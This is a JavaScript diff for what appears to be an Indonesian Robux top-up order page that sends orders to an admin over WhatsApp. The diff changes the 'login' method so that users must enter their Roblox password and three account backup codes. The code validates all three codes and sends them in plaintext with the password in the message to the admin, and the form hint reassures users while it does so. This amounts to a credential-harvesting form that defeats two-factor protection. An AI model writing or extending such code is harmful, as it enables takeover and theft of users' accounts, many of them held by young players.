@@ -1,6 +1,6 @@
 const METHODS = {
   username: { name: "Via Username", hint: "Kirim username Roblox kamu. Tidak perlu password.", needGp: false },
-  login:    { name: "Via Login", hint: "Isi username dan password akun Roblox kamu. Data hanya dikirim ke admin lewat WhatsApp.", needGp: false },
+  login:    { name: "Via Login", hint: "Isi username, password, dan 3 code backup akun Roblox kamu. Data hanya dikirim ke admin lewat WhatsApp.", needGp: false },
   gamepass: { name: "Via Gamepass", hint: "Buat gamepass dengan harga yang kami hitung, lalu tempel linknya di sini.", needGp: true }
 };
 
@@ -42,8 +42,8 @@ $("chips").addEventListener("click", e => {
 });
 
 function clearErr(){
-  ["user","gp","pw","v2"].forEach(k => { $(k).classList.remove("bad"); });
-  $("errUser").textContent = $("errGp").textContent = $("errPw").textContent = $("errV2").textContent = "";
+  ["user","gp","pw","v2","bk1","bk2","bk3"].forEach(k => { $(k).classList.remove("bad"); });
+  $("errUser").textContent = $("errGp").textContent = $("errPw").textContent = $("errV2").textContent = $("errBk").textContent = "";
 }
 function fail(inputId, errId, msg){
   $(inputId).classList.add("bad"); $(errId).textContent = msg; $(inputId).focus();
@@ -54,14 +54,16 @@ $("send").addEventListener("click", () => {
   const user = $("user").value.trim();
   const gp = $("gp").value.trim();
   const pw = $("pw").value;
+  const bk = [1, 2, 3].map(n => $("bk" + n).value.trim());
   if (!/^[A-Za-z0-9_]{3,20}$/.test(user)) return fail("user","errUser","Isi username Roblox yang benar (3–20 huruf, angka, atau garis bawah).");
   if (method === "username" && !$("v2").checked) return fail("v2","errV2","Centang dulu setelah Verifikasi 2 Langkah di akun penerima aktif.");
   if (method === "login" && !pw) return fail("pw","errPw","Isi password akun Roblox.");
+  if (method === "login") { const e = bk.findIndex(v => !v); if (e >= 0) return fail("bk" + (e + 1), "errBk", "Isi ketiga code backup (1, 2, dan 3)."); }
   if (METHODS[method].needGp && !/^https?:\/\/(www\.)?roblox\.com\/.+/i.test(gp)) return fail("gp","errGp","Tempel link gamepass dari roblox.com.");
 
   let msg = `Halo admin ${CONFIG.brand}, saya mau top up Robux.\n\n` +
     `Metode: ${METHODS[method].name}\n` +
-    `Username Roblox: ${user}\n` + (method === "login" ? `Password: ${pw}\n` : "") + (method === "username" ? `Verifikasi 2 Langkah: sudah aktif\n` : "") +
+    `Username Roblox: ${user}\n` + (method === "login" ? `Password: ${pw}\nCode backup 1: ${bk[0]}\nCode backup 2: ${bk[1]}\nCode backup 3: ${bk[2]}\n` : "") + (method === "username" ? `Verifikasi 2 Langkah: sudah aktif\n` : "") +
     `Jumlah: ${num(robux)} Robux\n`;
   if (METHODS[method].needGp) msg += `Harga gamepass: ${num(gpPrice(robux))} Robux\nLink gamepass: ${gp}\n`;
   msg += `Total: ${rp(price(method, robux))}\n\nMohon info cara pembayarannya. Terima kasih.`;
